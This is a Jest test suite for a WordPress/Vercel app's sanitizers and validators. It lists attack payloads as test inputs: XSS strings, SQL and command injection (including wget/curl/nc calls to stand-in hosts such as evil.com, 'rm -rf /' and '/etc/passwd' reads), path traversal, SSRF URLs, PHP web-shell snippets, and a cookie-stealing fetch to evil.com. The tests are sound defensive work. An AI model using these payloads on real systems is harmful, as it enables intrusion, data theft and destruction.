/**
 * Comprehensive Security Testing Suite
 * Tests all validation and sanitization measures against known attack vectors
 */

import { jest } from '@jest/globals';
import { validationUtils } from '../../utils/validation';
import { contentSanitizer } from '../../utils/content-sanitizer';
import { urlImageValidator } from '../../utils/url-image-validator';
import { wordPressSanitizer } from '../../utils/wordpress-sanitizer';
import { createValidationMiddleware } from '../../middleware/validation-middleware';
import type { VercelRequest, VercelResponse } from '@vercel/node';

// Mock logger
jest.mock('../../utils/logger', () => ({
  logger: {
    warn: jest.fn(),
    info: jest.fn(),
    error: jest.fn(),
    debug: jest.fn()
  }
}));

describe('Security Test Suite', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('XSS Attack Prevention', () => {
    const xssPayloads = [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(1)">',
      
      // Event handler XSS
      '<div onclick="alert(1)">Click me</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<body onload="alert(1)">',
      
      // JavaScript protocol XSS
      'javascript:alert(document.cookie)',
      'JAVASCRIPT:alert(String.fromCharCode(88,83,83))',
      'java\u0000script:alert(1)',
      
      // Data URL XSS
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      
      // VBScript XSS
      'vbscript:msgbox("XSS")',
      
      // HTML entity XSS
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      
      // CSS expression XSS
      '<div style="width: expression(alert(1))">',
      '<div style="background: url(javascript:alert(1))">',
      
      // Advanced XSS bypasses
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      
      // Polyglot XSS
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
      
      // Template injection
      '{{constructor.constructor("alert(1)")()}}',
      '${alert(1)}',
      
      // HTML5 XSS
      '<video><source onerror="alert(1)">',
      '<audio src="x" onerror="alert(1)">',
      '<details open ontoggle="alert(1)">',
      
      // Filter bypass attempts
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<img src="x" onerror="alert(1)" style="display:none">',
      '<!--[if IE]><script>alert(1)</script><![endif]-->'
    ];

    it('should prevent XSS through HTML sanitization', () => {
      xssPayloads.forEach(payload => {
        const result = contentSanitizer.sanitizeHtml(payload);
        
        // Should not contain executable JavaScript
        expect(result.sanitized).not.toMatch(/<script/i);
        expect(result.sanitized).not.toMatch(/javascript:/i);
        expect(result.sanitized).not.toMatch(/vbscript:/i);
        expect(result.sanitized).not.toMatch(/on\w+\s*=/i);
        expect(result.sanitized).not.toMatch(/expression\s*\(/i);
        
        // Should be marked as modified
        expect(result.wasModified).toBe(true);
        expect(result.removedElements.length).toBeGreaterThan(0);
      });
    });

    it('should prevent XSS through text sanitization', () => {
      xssPayloads.forEach(payload => {
        const result = contentSanitizer.sanitizeText(payload);
        
        // Should not contain HTML tags or JavaScript
        expect(result.sanitized).not.toMatch(/<[^>]*>/);
        expect(result.sanitized).not.toMatch(/javascript:/i);
        expect(result.sanitized).not.toMatch(/vbscript:/i);
        
        if (payload.includes('<') || payload.includes('javascript:') || payload.includes('vbscript:')) {
          expect(result.wasModified).toBe(true);
        }
      });
    });

    it('should prevent XSS through string validation', () => {
      xssPayloads.forEach(payload => {
        const result = validationUtils.validateString(payload, { 
          pattern: /^[a-zA-Z0-9\s\-_.,!?]+$/ 
        });
        
        // Should reject dangerous patterns
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      // Classic SQL injection
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM users --",
      
      // Blind SQL injection
      "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
      "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64",
      
      // Time-based SQL injection
      "'; WAITFOR DELAY '00:00:10' --",
      "' OR SLEEP(10) --",
      
      // UNION-based SQL injection
      "' UNION SELECT username, password FROM users --",
      "' UNION ALL SELECT NULL, username||password FROM users --",
      
      // Boolean-based SQL injection
      "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
      "' AND (SELECT COUNT(*) FROM users)>0 --",
      
      // Error-based SQL injection
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      
      // Second-order SQL injection
      "admin'--",
      "'; INSERT INTO logs VALUES ('injected') --",
      
      // NoSQL injection
      "{ $ne: null }",
      "'; return db.users.find(); var dummy='",
      
      // XML injection
      "'; SELECT EXTRACTVALUE('<root><user>admin</user></root>', '/root/user') --"
    ];

    it('should prevent SQL injection through string validation', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = validationUtils.validateString(payload, {
          pattern: /^[a-zA-Z0-9\s\-_@.]+$/
        });
        
        // Should reject SQL injection patterns
        expect(result.isValid).toBe(false);
      });
    });

    it('should detect SQL injection patterns in content', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = contentSanitizer.detectMaliciousPatterns(payload);
        
        // Should detect SQL injection patterns
        if (payload.includes('UNION') || payload.includes('SELECT') || payload.includes('DROP')) {
          expect(result.malicious).toBe(true);
          expect(result.patterns).toContain('sqlInjection');
        }
      });
    });

    it('should sanitize SQL injection attempts in WordPress meta', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = wordPressSanitizer.sanitizeWordPressMeta(payload, 'test_meta');
        
        // Should sanitize dangerous SQL patterns
        expect(result.sanitized).not.toMatch(/UNION|SELECT|DROP|INSERT|UPDATE|DELETE/i);
        expect(result.wasModified).toBe(true);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      // Basic command injection
      '; ls -la',
      '&& cat /etc/passwd',
      '| nc -l 4444',
      
      // Windows command injection
      '& dir C:\\',
      '&& type C:\\Windows\\System32\\drivers\\etc\\hosts',
      
      // Pipe-based injection
      '| wget http://evil.com/shell.php',
      '| curl http://attacker.com/backdoor',
      
      // Backtick injection
      '`id`',
      '`whoami`',
      '$(uname -a)',
      
      // PHP system functions
      'system("rm -rf /")',
      'exec("cat /etc/passwd")',
      'shell_exec("ls -la")',
      'passthru("id")',
      
      // Node.js command injection
      'require("child_process").exec("ls")',
      'process.binding("spawn_sync")',
      
      // Encoded command injection
      '%3B%20ls%20-la',
      '%26%26%20cat%20%2Fetc%2Fpasswd'
    ];

    it('should prevent command injection through string validation', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = validationUtils.validateString(payload, {
          pattern: /^[a-zA-Z0-9\s\-_.]+$/
        });
        
        // Should reject command injection patterns
        expect(result.isValid).toBe(false);
      });
    });

    it('should sanitize command injection in text content', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = contentSanitizer.sanitizeText(payload);
        
        // Should remove dangerous command characters
        expect(result.sanitized).not.toMatch(/[;&|`$]/);
        expect(result.sanitized).not.toMatch(/system|exec|shell_exec|passthru/i);
        
        if (payload.includes(';') || payload.includes('&') || payload.includes('|') || payload.includes('`')) {
          expect(result.wasModified).toBe(true);
        }
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      
      // URL encoded path traversal
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
      
      // Double encoded
      '%252e%252e%252f',
      '%c0%ae%c0%ae%c0%af',
      
      // Unicode encoded
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
      
      // Null byte injection
      '../../../etc/passwd%00.jpg',
      '..\\..\\..\\windows\\system32\\config\\sam%00.txt',
      
      // Absolute paths
      '/etc/passwd',
      'C:\\windows\\system32\\config\\sam',
      '\\\\server\\share\\file.txt',
      
      // Bypass attempts
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd',
      '..///..///..///etc/passwd'
    ];

    it('should prevent path traversal in file paths', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = validationUtils.validateString(payload, {
          pattern: /^[a-zA-Z0-9._-]+$/
        });
        
        // Should reject path traversal patterns
        expect(result.isValid).toBe(false);
      });
    });

    it('should sanitize path traversal attempts', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = validationUtils.sanitizeString(payload);
        
        // Should remove path traversal characters
        expect(result).not.toMatch(/\.\./);
        expect(result).not.toMatch(/[\/\\]/);
        expect(result).not.toMatch(/%2e|%2f|%5c/i);
      });
    });
  });

  describe('URL Security Validation', () => {
    const maliciousUrls = [
      // JavaScript protocol
      'javascript:alert(document.cookie)',
      'JAVASCRIPT:alert(1)',
      'java\u0000script:alert(1)',
      
      // Data URLs
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      
      // VBScript protocol
      'vbscript:msgbox("XSS")',
      
      // File protocol
      'file:///etc/passwd',
      'file://C:/windows/system32/config/sam',
      
      // FTP with credentials
      'ftp://username:password@example.com',
      
      // SSRF attempts
      'http://127.0.0.1:22',
      'http://localhost:3306',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]:80',
      
      // URL shorteners (potential phishing)
      'http://bit.ly/malicious',
      'http://tinyurl.com/evil',
      'http://t.co/phishing',
      
      // Redirect attempts
      'http://example.com?redirect=http://evil.com',
      'http://example.com/redirect.php?url=javascript:alert(1)',
      
      // IP address bypasses
      'http://2130706433', // 127.0.0.1 in decimal
      'http://0x7f000001', // 127.0.0.1 in hex
      'http://017700000001', // 127.0.0.1 in octal
      
      // Unicode domain attacks
      'http://еxample.com', // Cyrillic 'e'
      'http://googlе.com', // Cyrillic 'e'
      
      // Very long URLs (DoS)
      'http://example.com/' + 'a'.repeat(10000)
    ];

    it('should block malicious URLs', () => {
      maliciousUrls.forEach(url => {
        const result = urlImageValidator.validateUrl(url);
        
        // Most malicious URLs should be blocked
        if (url.startsWith('javascript:') || 
            url.startsWith('vbscript:') || 
            url.startsWith('data:') ||
            url.startsWith('file:') ||
            url.includes('127.0.0.1') ||
            url.includes('localhost') ||
            url.length > 2048) {
          expect(result.isValid).toBe(false);
        }
      });
    });

    it('should detect suspicious URL patterns', () => {
      maliciousUrls.forEach(url => {
        const result = urlImageValidator.hasSuspiciousPatterns(url);
        
        // Should detect suspicious patterns in many malicious URLs
        if (url.startsWith('javascript:') || 
            url.startsWith('data:') || 
            url.includes('bit.ly') ||
            url.includes('redirect=')) {
          expect(result.suspicious).toBe(true);
        }
      });
    });
  });

  describe('WordPress Security Validation', () => {
    const maliciousWordPressContent = [
      // Dangerous shortcodes
      '[php]<?php system($_GET["cmd"]); ?>[/php]',
      '[exec]rm -rf /[/exec]',
      '[eval]alert(1)[/eval]',
      
      // Malicious Gutenberg blocks
      '<!-- wp:html --><script>alert(1)</script><!-- /wp:html -->',
      '<!-- wp:code --><?php system($_GET["cmd"]); ?><!-- /wp:code -->',
      
      // WordPress-specific XSS
      '[gallery ids="1) OR 1=1 UNION SELECT user_login, user_pass FROM wp_users#"]',
      
      // Shortcode with malicious attributes
      '[contact-form onclick="alert(1)"]',
      '[embed src="javascript:alert(1)"]',
      
      // PHP in content
      '<?php echo shell_exec($_GET["cmd"]); ?>',
      '<%eval request("cmd")%>',
      
      // WordPress function calls
      '<?php wp_die("hacked"); ?>',
      '<?php wp_redirect("http://evil.com"); ?>',
      
      // Comment injection
      '<!--wp:paragraph--><!--injection--><script>alert(1)</script><!--/injection--><!--/wp:paragraph-->'
    ];

    it('should sanitize dangerous WordPress content', () => {
      maliciousWordPressContent.forEach(content => {
        const result = wordPressSanitizer.sanitizePostContent(content);
        
        // Should remove dangerous content
        expect(result.sanitized).not.toMatch(/<\?php/i);
        expect(result.sanitized).not.toMatch(/<script/i);
        expect(result.sanitized).not.toMatch(/\[php\]/i);
        expect(result.sanitized).not.toMatch(/\[exec\]/i);
        expect(result.sanitized).not.toMatch(/\[eval\]/i);
        expect(result.sanitized).not.toMatch(/system\(/i);
        expect(result.sanitized).not.toMatch(/shell_exec/i);
        
        expect(result.wasModified).toBe(true);
        expect(result.removedElements.length).toBeGreaterThan(0);
      });
    });

    it('should block dangerous shortcodes', () => {
      const dangerousShortcodes = ['php', 'exec', 'eval', 'system', 'shell_exec'];
      
      dangerousShortcodes.forEach(shortcode => {
        const isValid = wordPressSanitizer.validateShortcode(shortcode, '', {});
        expect(isValid).toBe(false);
      });
    });

    it('should filter blocked Gutenberg blocks', () => {
      const blockedContent = '<!-- wp:html --><script>alert(1)</script><!-- /wp:html -->';
      const result = wordPressSanitizer.sanitizePostContent(blockedContent, {
        blockedGutenbergBlocks: ['core/html']
      });
      
      expect(result.sanitized).not.toContain('wp:html');
      expect(result.sanitized).not.toContain('<script>');
      expect(result.wordPressSpecific?.blocksModified).toContain('core/html');
    });
  });

  describe('Input Validation Security', () => {
    const maliciousInputs = [
      // Prototype pollution
      { '__proto__': { 'polluted': true } },
      { 'constructor': { 'prototype': { 'polluted': true } } },
      
      // Large inputs (DoS)
      { 'field': 'a'.repeat(1000000) },
      
      // Type confusion
      { 'expectedString': 123 },
      { 'expectedNumber': 'not a number' },
      { 'expectedArray': 'not an array' },
      
      // Null bytes
      { 'field': 'value\x00malicious' },
      
      // Unicode attacks
      { 'field': 'value\u200E\u202Emalicious' },
      
      // Too many fields
      ...Array.from({ length: 200 }, (_, i) => ({ [`field${i}`]: 'value' }))
        .reduce((acc, obj) => ({ ...acc, ...obj }), {})
    ];

    it('should handle prototype pollution prevention', () => {
      const middleware = createValidationMiddleware({
        body: { name: { type: 'string', required: true } },
        preventPrototypePollution: true
      });

      const mockReq = {
        body: { name: 'test', __proto__: { polluted: true } }
      } as any;
      const mockRes = { status: jest.fn().mockReturnThis(), json: jest.fn() } as any;
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockReq.body.__proto__).toBeUndefined();
      expect(mockNext).toHaveBeenCalled();
    });

    it('should enforce field count limits', () => {
      const middleware = createValidationMiddleware({
        body: { name: { type: 'string', required: true } },
        maxFieldCount: 5
      });

      const mockReq = {
        body: Object.fromEntries(Array.from({ length: 10 }, (_, i) => [`field${i}`, 'value']))
      } as any;
      const mockRes = { status: jest.fn().mockReturnThis(), json: jest.fn() } as any;
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(400);
      expect(mockNext).not.toHaveBeenCalled();
    });

    it('should validate input types correctly', () => {
      const stringResult = validationUtils.validateString(123 as any);
      expect(stringResult.isValid).toBe(false);

      const numberResult = validationUtils.validateNumber('not a number');
      expect(numberResult.isValid).toBe(false);

      const emailResult = validationUtils.validateEmail('invalid-email');
      expect(emailResult.isValid).toBe(false);
    });
  });

  describe('Content Security Policy Validation', () => {
    it('should sanitize content to be CSP-compliant', () => {
      const unsafeContent = `
        <div onclick="alert(1)">Click me</div>
        <script>alert('XSS')</script>
        <style>body { background: url('javascript:alert(1)'); }</style>
        <img src="x" onerror="alert(1)">
      `;

      const result = contentSanitizer.sanitizeHtml(unsafeContent);

      // Should remove all inline JavaScript
      expect(result.sanitized).not.toMatch(/onclick/i);
      expect(result.sanitized).not.toMatch(/<script/i);
      expect(result.sanitized).not.toMatch(/javascript:/i);
      expect(result.sanitized).not.toMatch(/onerror/i);
      
      expect(result.wasModified).toBe(true);
    });
  });

  describe('File Upload Security', () => {
    const maliciousFileTypes = [
      'malware.exe',
      'script.php',
      'backdoor.jsp',
      'shell.asp',
      'virus.bat',
      'trojan.scr',
      'image.php.jpg', // Double extension
      'file.jpg.exe',  // Double extension
      'script.phtml',
      'shell.php5'
    ];

    it('should validate image file extensions', () => {
      maliciousFileTypes.forEach(filename => {
        const result = validationUtils.validateImageExtension(filename);
        
        // Should reject non-image extensions
        if (!filename.match(/\.(jpg|jpeg|png|gif|bmp|webp)$/i)) {
          expect(result.isValid).toBe(false);
        }
      });
    });

    it('should validate image MIME types', () => {
      const maliciousMimeTypes = [
        'application/x-php',
        'text/html',
        'application/javascript',
        'text/x-python',
        'application/x-httpd-php'
      ];

      maliciousMimeTypes.forEach(mimeType => {
        const result = validationUtils.validateImageMimeType(mimeType);
        expect(result.isValid).toBe(false);
      });
    });

    it('should validate file sizes', () => {
      const hugeSize = 100 * 1024 * 1024; // 100MB
      const result = validationUtils.validateFileSize(hugeSize, 10 * 1024 * 1024); // 10MB limit
      
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('exceeds maximum');
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    it('should handle large content gracefully', () => {
      const largeContent = 'a'.repeat(1000000); // 1MB
      const start = Date.now();
      
      const result = contentSanitizer.sanitizeText(largeContent, 100000); // 100KB limit
      const duration = Date.now() - start;
      
      // Should complete quickly and limit size
      expect(duration).toBeLessThan(1000); // Less than 1 second
      expect(result.sanitized.length).toBeLessThanOrEqual(100000);
      expect(result.wasModified).toBe(true);
    });

    it('should handle deep object nesting', () => {
      // Create deeply nested object
      let deepObject: any = {};
      let current = deepObject;
      for (let i = 0; i < 100; i++) {
        current.nested = {};
        current = current.nested;
      }
      current.value = 'deep';

      // Should handle without crashing
      expect(() => {
        JSON.stringify(deepObject);
      }).not.toThrow();
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not leak sensitive information in validation errors', () => {
      const result = validationUtils.validateEmail('invalid-email');
      
      // Error should not contain sensitive system information
      expect(result.error).not.toMatch(/password|secret|key|token/i);
      expect(result.error).not.toMatch(/file|path|directory/i);
      expect(result.error).not.toMatch(/database|connection|server/i);
    });

    it('should handle validation errors gracefully', () => {
      // Mock validation to throw an error
      const originalValidate = validationUtils.validateString;
      validationUtils.validateString = jest.fn().mockImplementation(() => {
        throw new Error('Internal validation error with sensitive info: /etc/passwd');
      });

      const middleware = createValidationMiddleware({
        body: { name: { type: 'string', required: true } }
      });

      const mockReq = { body: { name: 'test' } } as any;
      const mockRes = { status: jest.fn().mockReturnThis(), json: jest.fn() } as any;
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      // Should return generic error without sensitive information
      expect(mockRes.status).toHaveBeenCalledWith(400);
      const errorResponse = mockRes.json.mock.calls[0][0];
      expect(errorResponse.details[0].message).not.toContain('/etc/passwd');
      expect(errorResponse.details[0].message).toBe('Validation failed due to internal error');

      // Restore original function
      validationUtils.validateString = originalValidate;
    });
  });

  describe('Integration Security Tests', () => {
    it('should handle complex attack combinations', () => {
      const complexAttack = `
        <div onclick="fetch('/admin/delete-all').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))">
          [php]<?php 
            $cmd = $_GET['cmd'] ?? 'ls -la'; 
            echo shell_exec($cmd);
          ?>[/php]
          <!-- wp:html -->
          <script>
            document.cookie = 'admin=true';
            location.href = 'javascript:void(fetch("http://evil.com/steal?data=" + encodeURIComponent(document.cookie)))';
          </script>
          <!-- /wp:html -->
          <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==" />
        </div>
      `;

      const result = wordPressSanitizer.sanitizePostContent(complexAttack, {
        allowHtml: true,
        validateShortcodes: true,
        blockedGutenbergBlocks: ['core/html']
      });

      // Should remove all dangerous elements
      expect(result.sanitized).not.toMatch(/<script/i);
      expect(result.sanitized).not.toMatch(/onclick/i);
      expect(result.sanitized).not.toMatch(/\[php\]/i);
      expect(result.sanitized).not.toMatch(/shell_exec/i);
      expect(result.sanitized).not.toMatch(/wp:html/i);
      expect(result.sanitized).not.toMatch(/javascript:/i);
      expect(result.sanitized).not.toMatch(/data:image\/svg/i);
      
      expect(result.wasModified).toBe(true);
      expect(result.removedElements.length).toBeGreaterThan(0);
      expect(result.warnings.length).toBeGreaterThan(0);
    });

    it('should maintain security across multiple validation layers', () => {
      const maliciousInput = {
        title: '<script>alert("title")</script>My Title',
        content: '[exec]rm -rf /[/exec]<img src="x" onerror="alert(1)">Content',
        url: 'javascript:alert(document.cookie)',
        email: 'test@domain.com\'; DROP TABLE users; --'
      };

      // Layer 1: Basic validation
      const titleResult = validationUtils.validateString(maliciousInput.title);
      const urlResult = urlImageValidator.validateUrl(maliciousInput.url);
      const emailResult = validationUtils.validateEmail(maliciousInput.email);

      // Layer 2: Content sanitization
      const titleSanitized = contentSanitizer.sanitizeText(maliciousInput.title);
      const contentSanitized = wordPressSanitizer.sanitizePostContent(maliciousInput.content);

      // All layers should provide protection
      expect(titleSanitized.sanitized).not.toContain('<script>');
      expect(contentSanitized.sanitized).not.toContain('[exec]');
      expect(contentSanitized.sanitized).not.toContain('onerror');
      expect(urlResult.isValid).toBe(false);
      
      // Email should be valid format but we'd reject the SQL injection in application logic
      expect(emailResult.isValid).toBe(true); // Basic format is valid
      // But in real application, we'd have additional SQL injection protection
    });
  });

  describe('Performance Security Tests', () => {
    it('should handle regex DoS attempts', () => {
      // ReDoS attack pattern
      const redosPattern = 'a'.repeat(1000) + 'X';
      
      const start = Date.now();
      const result = validationUtils.validateString(redosPattern, {
        pattern: /^(a+)+$/
      });
      const duration = Date.now() - start;
      
      // Should complete quickly even with catastrophic backtracking pattern
      expect(duration).toBeLessThan(1000); // Should be much faster in practice
    });

    it('should limit processing time for large inputs', () => {
      const hugeInput = 'test '.repeat(100000); // Very large input
      
      const start = Date.now();
      const result = contentSanitizer.sanitizeText(hugeInput, 10000); // Limit to 10KB
      const duration = Date.now() - start;
      
      // Should complete quickly and limit output size
      expect(duration).toBeLessThan(1000);
      expect(result.sanitized.length).toBeLessThanOrEqual(10000);
    });
  });
});

export default {}; // Ensure this file is treated as a module